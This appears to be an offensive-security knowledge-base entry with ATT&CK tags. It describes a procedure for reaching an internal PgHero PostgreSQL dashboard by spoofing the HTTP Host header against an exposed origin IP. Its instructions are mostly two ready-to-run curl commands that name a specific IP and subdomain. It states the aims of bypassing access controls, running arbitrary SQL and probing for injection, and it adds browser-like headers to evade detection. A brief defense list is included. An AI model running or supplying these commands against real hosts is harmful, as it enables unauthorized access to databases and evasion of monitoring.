---
tags:
  - host-header-injection
  - access-bypass
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-host-header-spoof-to-pghero]]'
platforms:
  - Web
  - Cloud
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: c7c43744-3f26-4647-92f1-a189753f923e
created_at: '2025-12-14T03:15:05.042Z'
updated_at: '2025-12-14T03:15:05.042Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Access-PgHero-with-Curl-Host-Header-Spoofing

## Summary

This procedure spoofs HTTP Host headers using curl to access an internal PgHero instance on an exposed origin IP, enabling unauthorized PostgreSQL query execution and potential SQL injection.

## Description

Misconfigured load balancers route requests based on Host headers without IP validation, allowing direct access to development tools. Targets PgHero on ports 80/443, leading to database interaction in cloud setups like GCP.

## Requirements

1. Origin IP (e.g., 35.244.200.254) and target subdomain (pghero.dev-go.exchange)
2. curl installed on a Linux/macOS system
3. HTTPS support with -k for self-signed certs

## Defense

Defensive measures and detection strategies:

- Validate Host headers against allowed domains
- Restrict origin IP access to trusted proxies only
- Log and alert on anomalous Host header values

## Objectives

1. Bypass external access controls to reach PgHero UI
2. Execute arbitrary SQL queries
3. Assess for injection vulnerabilities

## Instructions

### Step 1: Craft and Execute Spoofed Request

**Context**: Send a GET request to the IP with spoofed Host to mimic internal routing.

**Command** ([[commands/curl-host-header-spoof-to-pghero]]):
```bash
curl -i -s -k -X GET -H 'Host: pghero.dev-go.exchange' -H 'Connection: close' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H 'Sec-Fetch-Site: same-origin' -H 'Referer: https://35.244.200.254/explain' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.' https://35.244.200.254/
```

> This includes browser-like headers to evade detection. Expected output: HTTP headers and PgHero HTML body.

### Step 2: Interact with PgHero Interface

**Context**: If successful, navigate to query endpoints (e.g., /explain) for SQL execution.

**Command** (Follow-up curl):
```bash
curl -k -H 'Host: pghero.dev-go.exchange' https://35.244.200.254/queries
```

> Test for SQLi by injecting payloads in query parameters.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-host-header-spoof-to-pghero]]

## Tools Used

- [[tools/curl]]

## Tags

- [[host-header-injection]]
- [[access-bypass]]
